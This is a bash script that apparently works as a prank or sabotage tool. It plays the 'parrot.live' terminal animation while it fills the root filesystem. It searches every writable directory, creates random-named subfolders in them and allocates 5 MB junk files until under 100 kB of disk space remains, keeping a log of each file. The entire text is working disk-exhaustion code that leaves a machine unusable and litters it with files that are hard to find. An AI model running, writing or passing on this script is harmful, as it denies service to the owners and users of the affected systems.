#!/bin/bash

MEMORY_LEFT_IN_KB=100
file_size_mb=5
num_subfolders=5

check_free_space() {
    free_space=$(df / | awk '{print $4}' | tail -n 1)
    if [ "$free_space" -lt "$MEMORY_LEFT_IN_KB" ]
    then
        pkill -f "curl parrot.live"
        echo "Less than 100 kB free on root"
        exit 0
    fi
}

parrot() {
    curl parrot.live &
}

root_paths=($(find / -type d -writable 2>/dev/null))
num_paths=${#root_paths[@]}

main() {

    parrot

    while true
    do
        random_index=$((RANDOM % num_paths))
        random_path="${root_paths[$random_index]}"

        temp=()
        for (( j=0; j < $num_subfolders; ++j ))
        do
            subfolder=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
            new_dir_path="$random_path$subfolder/"
            if ! mkdir -p "$new_dir_path" 2>/dev/null
            then
                break
            fi
            temp+=("$new_dir_path")
            num_files=$(echo $((3 + $RANDOM % 10)))
            for (( k=0; k < $num_files; ++k ))
            do
                check_free_space
                filenamepart="$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 16 | head -n 1)"
                file_name="$filenamepart"
                file_path="$random_path$subfolder/$file_name"
                if ! fallocate -l $file_size_mb"M" "$file_path" 2>/dev/null
                then
                    break
                fi
                echo "$file_path $(date) $file_size_mb MB" >> script_log.txt
            done
        done
    done
    
    exit 0
}

main
